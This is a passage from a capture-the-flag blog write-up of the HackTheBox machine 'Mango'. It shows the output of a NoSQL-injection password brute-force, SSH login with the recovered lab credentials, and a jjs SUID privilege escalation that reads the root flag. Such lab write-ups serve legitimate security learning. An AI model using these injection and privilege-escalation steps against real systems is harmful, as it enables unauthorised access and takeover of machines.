</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Found one more char : </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>password</span><span class=o>+</span><span class=n>c</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>password</span> <span class=o>+=</span> <span class=n>c</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s run it for <code>admin</code> user:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ python bf.py
</span></span><span class=line><span class=cl>Found one more char : t
</span></span><span class=line><span class=cl>Found one more char : t9
</span></span><span class=line><span class=cl>Found one more char : t9K
</span></span><span class=line><span class=cl>Found one more char : t9Kc
</span></span><span class=line><span class=cl>Found one more char : t9KcS
</span></span><span class=line><span class=cl>Found one more char : t9KcS3
</span></span><span class=line><span class=cl>Found one more char : t9KcS3&gt;
</span></span><span class=line><span class=cl>Found one more char : t9KcS3&gt;!
</span></span><span class=line><span class=cl>Found one more char : t9KcS3&gt;!0
</span></span><span class=line><span class=cl>Found one more char : t9KcS3&gt;!0B
</span></span><span class=line><span class=cl>Found one more char : t9KcS3&gt;!0B#
</span></span><span class=line><span class=cl>Found one more char : t9KcS3&gt;!0B#2
</span></span></code></pre></td></tr></table></div></div><p>We can also run it for <code>mango</code>.</p><p>Finally we have 2 accounts:</p><ul><li><code>admin</code> / <code>t9KcS3>!0B#2</code></li><li><code>mango</code> / <code>h3mXK8RhU~f{]f5H</code></li></ul><p>There is even a guy that made a small
<a href=https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration>script / tool</a>
around this so you don&rsquo;t have to change your script each time.</p><p>If you try to login with a accounts you will get this message:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Under Plantation<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h2</span><span class=p>&gt;</span>Sorry for the inconvenience. We just started farming!<span class=p>&lt;/</span><span class=nt>h2</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h3</span><span class=p>&gt;</span>To contact us in the meantime please email: admin@mango.htb<span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>We rarely look at our inboxes.<span class=p>&lt;/</span><span class=nt>h3</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=system-enumeration>System enumeration<a hidden class=anchor aria-hidden=true href=#system-enumeration>#</a></h3><p><strong>TL;DR</strong>: jjs history</p><p>It seems there is not more stuff to do on teh webapp.</p><p>But we can use the credentials to connect via ssh.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh mango@10.10.10.162
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mango@mango:~$ ls -lhA /home/admin/
</span></span><span class=line><span class=cl>total 40K
</span></span><span class=line><span class=cl>lrwxrwxrwx 1 admin admin    9 Sep 27 14:30 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- 1 admin admin  220 Apr  4  2018 .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- 1 admin admin 3.7K Apr  4  2018 .bashrc
</span></span><span class=line><span class=cl>-rw-rw-r-- 1 root  admin  481 Mar 27 16:53 .jjs.history
</span></span><span class=line><span class=cl>-rw-rw-r-- 1 admin admin  227 Mar 27 16:53 js
</span></span><span class=line><span class=cl>drwxrwxr-x 3 admin admin 4.0K Mar 27 16:27 .local
</span></span><span class=line><span class=cl>-rw-r--r-- 1 admin admin  807 Apr  4  2018 .profile
</span></span><span class=line><span class=cl>-rw-rw-r-- 1 admin admin 8.5K Mar 27 16:31 test.py
</span></span><span class=line><span class=cl>-r-------- 1 admin admin   33 Sep 27 14:29 user.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mango@mango:~$ su admin
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl>$ id
</span></span><span class=line><span class=cl>uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
</span></span><span class=line><span class=cl>$ cd
</span></span><span class=line><span class=cl>$ cat user.txt
</span></span><span class=line><span class=cl>79bf31c6c6eb38a8567832f7f8b47e92
</span></span></code></pre></td></tr></table></div></div><p>We found the user flag we also saw there is a <code>.jjs.history</code> file.</p><h3 id=system-privilege-escalation-of-machine>System Privilege Escalation of Machine<a hidden class=anchor aria-hidden=true href=#system-privilege-escalation-of-machine>#</a></h3><p><strong>TL;DR</strong>: jjs SUID</p><p>So let&rsquo;s find where is the <code>jjs</code> binary on the file system.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>admin@mango:/home/admin$ ls -lh $(which jjs)
</span></span><span class=line><span class=cl>lrwxrwxrwx 1 root root 21 Sep 27 14:15 /usr/bin/jjs -&gt; /etc/alternatives/jjs
</span></span><span class=line><span class=cl>admin@mango:/home/admin$ ls -lh /etc/alternatives/jjs
</span></span><span class=line><span class=cl>lrwxrwxrwx 1 root root 42 Sep 27 14:15 /etc/alternatives/jjs -&gt; /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
</span></span><span class=line><span class=cl>admin@mango:/home/admin$ ls -lh /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
</span></span><span class=line><span class=cl>-rwsr-sr-- 1 root admin 11K Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
</span></span></code></pre></td></tr></table></div></div><p>We can see there is a SUID bit on the binary.</p><p>As each time we want to do an pe on Linux, let&rsquo;s check <a href=https://gtfobins.github.io/>GTFOBins</a>
first. There is a page for <a href=https://gtfobins.github.io/gtfobins/jjs/#suid>jjs</a>.</p><p>So using the SUID pe payload we found on <a href=https://gtfobins.github.io/>GTFOBins</a>, we can elevate
our privileges to root, and use this to read the root flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ echo &#34;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;cp /root/root.txt /tmp/.cyfun/cyfun.txt&#39;).waitFor()&#34; | jjs
</span></span><span class=line><span class=cl>$ echo &#34;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;chmod g+rw /tmp/.cyfun/cyfun.txt&#39;).waitFor()&#34; | jjs
</span></span><span class=line><span class=cl>$ cat /tmp/.cyfun/cyfun.txt
</span></span><span class=line><span class=cl>8a8ef79a7a2fbb01ea81688424e9ab15
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>